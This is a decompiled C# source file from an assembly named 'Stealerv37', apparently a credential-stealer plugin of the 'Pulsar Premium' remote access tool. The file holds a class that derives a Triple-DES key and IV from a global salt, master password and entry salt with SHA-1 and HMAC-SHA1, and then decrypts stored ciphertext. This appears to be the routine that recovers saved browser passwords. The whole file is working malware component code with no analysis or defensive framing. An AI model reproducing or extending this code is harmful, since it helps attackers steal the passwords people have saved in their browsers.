// Decompiled with JetBrains decompiler
// Type: Intelix.Helper.Encrypted.TripleDes
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using System;
using System.IO;
using System.Security.Cryptography;

#nullable disable
namespace Intelix.Helper.Encrypted;

internal class TripleDes
{
  private byte[] CipherText { get; }

  private byte[] GlobalSalt { get; }

  private byte[] MasterPassword { get; }

  private byte[] EntrySalt { get; }

  public byte[] Key { get; private set; }

  public byte[] Vector { get; private set; }

  public TripleDes(byte[] cipherText, byte[] globalSalt, byte[] masterPass, byte[] entrySalt)
  {
    this.CipherText = cipherText;
    this.GlobalSalt = globalSalt;
    this.MasterPassword = masterPass;
    this.EntrySalt = entrySalt;
  }

  public TripleDes(byte[] globalSalt, byte[] masterPassword, byte[] entrySalt)
  {
    this.GlobalSalt = globalSalt;
    this.MasterPassword = masterPassword;
    this.EntrySalt = entrySalt;
  }

  public void ComputeVoid()
  {
    SHA1CryptoServiceProvider cryptoServiceProvider = new SHA1CryptoServiceProvider();
    byte[] numArray1 = new byte[this.GlobalSalt.Length + this.MasterPassword.Length];
    Array.Copy((Array) this.GlobalSalt, 0, (Array) numArray1, 0, this.GlobalSalt.Length);
    Array.Copy((Array) this.MasterPassword, 0, (Array) numArray1, this.GlobalSalt.Length, this.MasterPassword.Length);
    byte[] hash1 = cryptoServiceProvider.ComputeHash(numArray1);
    byte[] numArray2 = new byte[hash1.Length + this.EntrySalt.Length];
    Array.Copy((Array) hash1, 0, (Array) numArray2, 0, hash1.Length);
    Array.Copy((Array) this.EntrySalt, 0, (Array) numArray2, hash1.Length, this.EntrySalt.Length);
    byte[] hash2 = cryptoServiceProvider.ComputeHash(numArray2);
    byte[] numArray3 = new byte[20];
    Array.Copy((Array) this.EntrySalt, 0, (Array) numArray3, 0, this.EntrySalt.Length);
    for (int length = this.EntrySalt.Length; length < 20; ++length)
      numArray3[length] = (byte) 0;
    byte[] numArray4 = new byte[numArray3.Length + this.EntrySalt.Length];
    Array.Copy((Array) numArray3, 0, (Array) numArray4, 0, numArray3.Length);
    Array.Copy((Array) this.EntrySalt, 0, (Array) numArray4, numArray3.Length, this.EntrySalt.Length);
    byte[] hash3;
    byte[] hash4;
    using (HMACSHA1 hmacshA1 = new HMACSHA1(hash2))
    {
      hash3 = hmacshA1.ComputeHash(numArray4);
      byte[] hash5 = hmacshA1.ComputeHash(numArray3);
      byte[] numArray5 = new byte[hash5.Length + this.EntrySalt.Length];
      Array.Copy((Array) hash5, 0, (Array) numArray5, 0, hash5.Length);
      Array.Copy((Array) this.EntrySalt, 0, (Array) numArray5, hash5.Length, this.EntrySalt.Length);
      hash4 = hmacshA1.ComputeHash(numArray5);
    }
    byte[] destinationArray = new byte[hash3.Length + hash4.Length];
    Array.Copy((Array) hash3, 0, (Array) destinationArray, 0, hash3.Length);
    Array.Copy((Array) hash4, 0, (Array) destinationArray, hash3.Length, hash4.Length);
    this.Key = new byte[24];
    for (int index = 0; index < this.Key.Length; ++index)
      this.Key[index] = destinationArray[index];
    this.Vector = new byte[8];
    int index1 = this.Vector.Length - 1;
    for (int index2 = destinationArray.Length - 1; index2 >= destinationArray.Length - this.Vector.Length; --index2)
    {
      this.Vector[index1] = destinationArray[index2];
      --index1;
    }
  }

  public byte[] Compute()
  {
    byte[] numArray1 = new byte[this.GlobalSalt.Length + this.MasterPassword.Length];
    Buffer.BlockCopy((Array) this.GlobalSalt, 0, (Array) numArray1, 0, this.GlobalSalt.Length);
    Buffer.BlockCopy((Array) this.MasterPassword, 0, (Array) numArray1, this.GlobalSalt.Length, this.MasterPassword.Length);
    byte[] hash1 = new SHA1Managed().ComputeHash(numArray1);
    byte[] numArray2 = new byte[hash1.Length + this.EntrySalt.Length];
    Buffer.BlockCopy((Array) hash1, 0, (Array) numArray2, 0, hash1.Length);
    Buffer.BlockCopy((Array) this.EntrySalt, 0, (Array) numArray2, this.EntrySalt.Length, hash1.Length);
    byte[] hash2 = new SHA1Managed().ComputeHash(numArray2);
    byte[] numArray3 = new byte[20];
    Array.Copy((Array) this.EntrySalt, 0, (Array) numArray3, 0, this.EntrySalt.Length);
    for (int length = this.EntrySalt.Length; length < 20; ++length)
      numArray3[length] = (byte) 0;
    byte[] numArray4 = new byte[numArray3.Length + this.EntrySalt.Length];
    Array.Copy((Array) numArray3, 0, (Array) numArray4, 0, numArray3.Length);
    Array.Copy((Array) this.EntrySalt, 0, (Array) numArray4, numArray3.Length, this.EntrySalt.Length);
    byte[] hash3;
    byte[] hash4;
    using (HMACSHA1 hmacshA1 = new HMACSHA1(hash2))
    {
      hash3 = hmacshA1.ComputeHash(numArray4);
      byte[] hash5 = hmacshA1.ComputeHash(numArray3);
      byte[] numArray5 = new byte[hash5.Length + this.EntrySalt.Length];
      Buffer.BlockCopy((Array) hash5, 0, (Array) numArray5, 0, hash5.Length);
      Buffer.BlockCopy((Array) this.EntrySalt, 0, (Array) numArray5, hash5.Length, this.EntrySalt.Length);
      hash4 = hmacshA1.ComputeHash(numArray5);
    }
    byte[] destinationArray1 = new byte[hash3.Length + hash4.Length];
    Array.Copy((Array) hash3, 0, (Array) destinationArray1, 0, hash3.Length);
    Array.Copy((Array) hash4, 0, (Array) destinationArray1, hash3.Length, hash4.Length);
    this.Key = new byte[24];
    for (int index = 0; index < this.Key.Length; ++index)
      this.Key[index] = destinationArray1[index];
    this.Vector = new byte[8];
    int index1 = this.Vector.Length - 1;
    for (int index2 = destinationArray1.Length - 1; index2 >= destinationArray1.Length - this.Vector.Length; --index2)
    {
      this.Vector[index1] = destinationArray1[index2];
      --index1;
    }
    byte[] sourceArray = TripleDes.DecryptByteDesCbc(this.Key, this.Vector, this.CipherText);
    byte[] numArray6 = new byte[24];
    byte[] destinationArray2 = numArray6;
    int length1 = numArray6.Length;
    Array.Copy((Array) sourceArray, (Array) destinationArray2, length1);
    return numArray6;
  }

  public static string DecryptStringDesCbc(byte[] key, byte[] iv, byte[] input)
  {
    using (TripleDESCryptoServiceProvider cryptoServiceProvider = new TripleDESCryptoServiceProvider())
    {
      cryptoServiceProvider.Key = key;
      cryptoServiceProvider.IV = iv;
      cryptoServiceProvider.Mode = CipherMode.CBC;
      cryptoServiceProvider.Padding = PaddingMode.None;
      ICryptoTransform decryptor = cryptoServiceProvider.CreateDecryptor(cryptoServiceProvider.Key, cryptoServiceProvider.IV);
      using (MemoryStream memoryStream = new MemoryStream(input))
      {
        using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read))
        {
          using (StreamReader streamReader = new StreamReader((Stream) cryptoStream))
            return streamReader.ReadToEnd();
        }
      }
    }
  }

  public static byte[] DecryptByteDesCbc(byte[] key, byte[] iv, byte[] input)
  {
    byte[] buffer = new byte[512 /*0x0200*/];
    using (TripleDESCryptoServiceProvider cryptoServiceProvider = new TripleDESCryptoServiceProvider())
    {
      cryptoServiceProvider.Key = key;
      cryptoServiceProvider.IV = iv;
      cryptoServiceProvider.Mode = CipherMode.CBC;
      cryptoServiceProvider.Padding = PaddingMode.None;
      ICryptoTransform decryptor = cryptoServiceProvider.CreateDecryptor(cryptoServiceProvider.Key, cryptoServiceProvider.IV);
      using (MemoryStream memoryStream = new MemoryStream(input))
      {
        using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read))
        {
          cryptoStream.Read(buffer, 0, buffer.Length);
          return buffer;
        }
      }
    }
  }
}
